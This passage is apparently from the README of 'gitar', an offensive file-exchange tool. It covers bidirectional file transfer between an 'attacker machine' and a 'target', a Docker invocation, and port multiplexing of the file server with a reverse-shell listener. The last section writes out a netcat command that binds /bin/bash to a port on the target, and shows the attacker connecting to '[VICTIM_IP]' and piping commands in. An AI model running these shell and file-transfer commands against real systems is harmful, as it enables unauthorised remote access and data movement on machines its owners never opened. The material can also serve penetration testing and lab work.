## Bidirectional exchange

You can also use `push` and `pull` shortcuts from attacker machine, after shortcuts have been loaded on target. It does not require addtional requirements on both machines. To do so it is recommended to load `alias` (put them in your `~/[SHELL]rc`) and launch gitar as follow:
```shell
gtrclean
gitar -bidi
```

On another attacker terminal window you can now push file to remote:
```shell
gtrbidi #to load gitar shortcut
push [FILENAME]

#[...] when your exchange is done
gtrclean 
```

***Notes:*** It will push files on remote within the directory where the `source` command occurs

### 🐋 Container and bidirectional exchange
```shell
BIDIR=$(mktemp -d);docker run -it --rm --cap-drop=all --cap-add=dac_override --net host --user $(id -u):$(id -g)  -v "${PWD}:/gitar/exchange" -v "$BIDIR:$BIDIR" ariary/gitar -bidi -bd $BIDIR
```

Then on attacker machine load shortcut:
```shell
gtrbidi.docker
```

### Limits
* Only work for file (does not work for `pullr` and `pushr`)
* Increase considerably the number of http requests on target

## Multiplexing & Port forwarding
> ***- Why?**
> - To expose my http file exchange server + reverse shell listener on the same port


It is useful when paired with a tunnel to localhost *(as with free version you often have only 1 port/tunnel at a time)*






## Load shortcut directly in your bind shell

**~>** *Below are the steps to have shortcuts directly embedded in your `nc` reverse shell*

On **Target machine**:
```shell
# Launch your classic listener
nc -nvlp 4444 -e /bin/bash
```

On **Attacker machine**:

1. Launch `gitar`server : `gitar -e [server_reachable_ip]` *(By default this will copy on clipboard the command to set up gitar exchange, also available in server output)*
2. Connect to the reverse shell + load shortcut within:`nc [VICTIM_IP] 4444` then `[CTRL+V]` 

An alternative is `export CMD=[CTRL+V] && (echo $CMD && cat) | nc [VICTIM_IP] 4444` *(Note: with `cat` you will not benefit of bash completion)*

**And enjoy you bindshell [🎶](#tldr---and-listen-music)**
